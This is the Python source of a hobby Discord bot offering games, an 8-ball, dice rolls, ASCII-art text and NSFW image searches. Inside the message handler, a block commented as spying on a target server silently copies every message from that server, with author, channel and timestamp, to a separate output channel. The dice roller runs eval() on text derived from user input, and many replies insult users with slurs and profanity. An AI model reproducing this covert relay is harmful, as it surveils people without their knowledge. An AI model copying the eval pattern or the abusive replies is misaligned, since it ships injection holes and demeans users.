import os

import discord
from dotenv import load_dotenv
import random
import pyfiglet
import requests
import re
import horny
from infocommand import *
import poker

load_dotenv()
TOKEN = os.getenv('DISCORD_TOKEN')
TARGET_SERVER_1 = os.getenv('TARGET_SERVER_1')
OUTPUT_CHANNEL_1 = os.getenv('OUTPUT_CHANNEL_1')

readingReply = False
Player1 = None
Player2 = None
playing = None

rps = ["rock", "paper", "scissors"]
ballcontent = [
    ":8ball: nope",
    ":8ball: lol no",
    ":8ball: nah"
    ":8ball: not happening ever",
    ":8ball: go ask ur mom",
    ":8ball: ok yeah i guess",
    ":8ball: maybe so",
    ":8ball: i don't think so, but i am not sure",
    ":8ball: 8ball machine :b:roke",
    ":8ball: yea definitely lol",
    ":8ball: isn't it obvious?",
    ":8ball: lmao yeah",
    ":8ball: yes",
    ":8ball: no fuck you",
    ":8ball: no fuck off",
    ":8ball: lol"
]

client = discord.Client()

def randomlistitem(listname, amount=1):
    list = listname[:] # copies the input list to pop
    output = []
    for i in range(0,amount):
        output.append(list.pop(random.randint(0, len(list) - 1)))
    return output

def stripprefix(text, prefix): # it looks better ok
    return text.split(prefix, 1)[1]


@client.event
async def on_ready():
    global lurkchannel
    print('We have logged in as {0.user}'.format(client))
    game = discord.Game("smeg help")
    await client.change_presence(status=discord.Status.online, activity=game)

@client.event
async def on_message(message):
    global readingReply
    global Player1, Player2
    global playing

    if message.author == client.user:
        return

    if message.guild == None: # DM
        if playing == 1 and Player2 != None:
            try:
                int(message.content)
            except ValueError:
                await client.get_user(message.author.id).send("play the game properly you moron, you picked `0` then")
            finally:
                if message.author == Player1:
                    ready = poker.discard("p1", message.content)
                elif message.author == Player2:
                    ready = poker.discard("p2", message.content)

            if ready != "no": #lol
                channel, p1Hand, p2Hand, winner, winnerValue = ready
                p1Hand = ", ".join(p1Hand)
                p2Hand = ", ".join(p2Hand)
                p1 = str(Player1)[:-5]
                p2 = str(Player2)[:-5]
                if winner == 1:
                    wintext = p1 + "** wins with **" + winnerValue[2]
                elif winner == 2:
                    wintext = p2 + "** wins with **" + winnerValue[2]
                else:
                    wintext = "it's a tie"

                text = p1 + "'s hand: " + p1Hand + "\n" + p2 + "'s hand: " + p2Hand + "\n**" + wintext + "!**"
                await channel.send(text)
                readingReply = False
                Player1 = None
                Player2 = None
                playing = None

    else: # Server
        if (message.author == Player1 or message.author == Player2) and readingReply:
            if message.content == "smeg cancel":
                readingReply = False
                Player1 = None
                Player2 = None
                playing = None
            if playing == 0: # RPS
                if message.content in rps:
                    pick = randomlistitem(rps)[0]
                    pickindex = rps.index(pick)
                    userpick = rps.index(message.content)
                    if pickindex - userpick == 1 or userpick - pickindex == 2:
                        await message.channel.send("haha i picked " + pick + " i won you noob")
                    elif userpick - pickindex == 1 or pickindex - userpick == 2:
                        await message.channel.send("ok i picked " + pick + " you won chronbratgulasions")
                    else:
                        await message.channel.send("i picked " + pick + " so we tied and that's stupid")
                else:
                    await message.channel.send("play the game properly you moron")
                    readingReply = False
                    Player1 = None
                    Player2 = None
                    playing = None

        if message.guild.id == int(TARGET_SERVER_1):  # spies on a certain server, if you are in that server congratulations
            header = ("#" + str(message.channel) + " - [" + str(message.author) + "] " + str(message.created_at.utcnow())[0:-7] + " UTC\n")
            channel = client.get_channel(int(OUTPUT_CHANNEL_1))  # output channel
            await channel.send(header + message.content)

        if message.content.startswith("smeg "):
            text = stripprefix(message.content, "smeg ")
            if text.startswith("play "): # gamer mode
                text = stripprefix(text, "play ")
                if playing != None:
                    await message.channel.send("no")
                elif text.startswith("rps"):
                    readingReply = True
                    Player1 = message.author
                    playing = 0
                    await message.channel.send("ok say `rock` `paper` or `scissors`")
                elif text.startswith("poker"):
                    readingReply = True
                    Player1 = message.author
                    playing = 1
                    await message.channel.send("waiting for player 2...\nplayer 2 type smeg join to join")
                elif text.startswith("stripppoker"):
                    await message.channel.send("https://spnati.net/")

            elif text == "join":
                if readingReply:
                    if message.author != Player1:
                        Player2 = message.author
                        readingReply = False
                        await message.channel.send("alright, sending your hands to DMs")
                        hand = poker.play(message.channel)
                        hand1 = ", ".join(hand[0])
                        hand2 = ", ".join(hand[1])
                        await client.get_user(Player1.id).send(
                            "your hand is: " + hand1 + "\n type the cards that you want to change (1-5) for example `134` type `0` to keep all cards")
                        await client.get_user(Player2.id).send(
                            "your hand is: " + hand2 + "\n type the cards that you want to change (1-5) for example `134` type `0` to keep all cards")
                    else:
                        await message.channel.send("what")
                else:
                    await message.channel.send("wtf are you trying to join")
            else:
                try:
                    text = infocommand(text, message.author)
                    if text != "":
                        await message.channel.send(infocommand(text, message.author))
                except AttributeError:
                    return


        if "sex" in message.content:
            await message.channel.send("sex")

        if message.content.startswith("8ball"):
            text = randomlistitem(ballcontent)[0]
            await message.channel.send(text)

        if "big" in message.content:
            text = stripprefix(message.content, "big")
            if text[0] == " ":
                text = stripprefix(text, " ")
            bigtext = pyfiglet.figlet_format(text)
            await message.channel.send("```\n" + bigtext + "\n```")

        if message.author.id == 365975655608745985: # Pokecord
            if message.content == "This is the wrong pokémon!":
                await message.channel.send("haha what a fucking retard")
            elif message.content.startswith("Congratulations"):
                await message.channel.send("wow ok nice reverse image search loser")
                await message.channel.send("ok now check the iv or ban")

        if message.content.startswith("gelbooru"):
            text = stripprefix(message.content, "gelbooru")
            apiresult = horny.gelbooru(text)
            try:
                imgurl = []
                for post in apiresult.get("posts"):
                    imgurl.append(post.attrib['file_url'])
                text = randomlistitem(imgurl, apiresult.get("amount"))
                text = "\n".join(text)
                if len(text) > 2000:
                    await message.channel.send("that's too much, coomer")
                else:
                    await message.channel.send(text)
            except (ValueError, IndexError):
                await message.channel.send("ok either you don't know how to search properly or your little kink is too stupid to be found")

        if message.content.startswith("e621 "):
            text = stripprefix(message.content, "e621 ")
            posts = horny.e621(text)
            await message.channel.send(posts)

        if message.content.startswith("roll "):
            text = stripprefix(message.content, "roll ")
            if "d" in text: # standard dice notation with basic arithmetic
                splittext = re.split("([-+*/])", text)
                result = splittext[:] # copies value
                for diceroll in splittext[::2]: # even indices
                    if not "d" in diceroll: # the notation is wrong somehow
                        await message.channel.send("good job dumbass you messed up the notation")
                        return 0
                    dicecalc = diceroll.split("d")
                    subresult = 0
                    if dicecalc[0] == "":
                        dicecalc[0] = 1
                    for i in range(0, int(dicecalc[0])):
                        subresult += random.randint(1, int(dicecalc[1]))
                    for index, value in enumerate(result):
                        if value == diceroll:
                            result[index] = str(subresult)
                finalresult = eval("".join(result))
                await message.channel.send(":game_die: **" + str(finalresult) + "**")

            if "%" in text:
                splittext = re.split("([-+*/])", text)
                result = splittext[:]  # copies value
                for percentage in splittext[::2]:  # even indices
                    if not "%" in percentage:  # the notation is wrong somehow
                        await message.channel.send("good job dumbass you messed up the notation")
                        return 0
                    fraction = percentage.replace("%", "")
                    fraction = str(round(float(fraction)) / 100)
                    for index, value in enumerate(result):
                        if value == percentage:
                            result[index] = str(fraction)
                finalresult = int(eval("".join(result)) * 100)
                if random.randint(1,100) <= finalresult:
                    rngbool = ":white_check_mark:"
                else:
                    rngbool = ":negative_squared_cross_mark:"
                await message.channel.send(":game_die: **" + str(finalresult) + "%**: " + rngbool)

        if message.content == "poger":
            readingReply = True
            Player1 = message.author
            playing = 1
            await message.channel.send("waiting for player 2...\nplayer 2 type smeg join to join")

client.run(TOKEN)
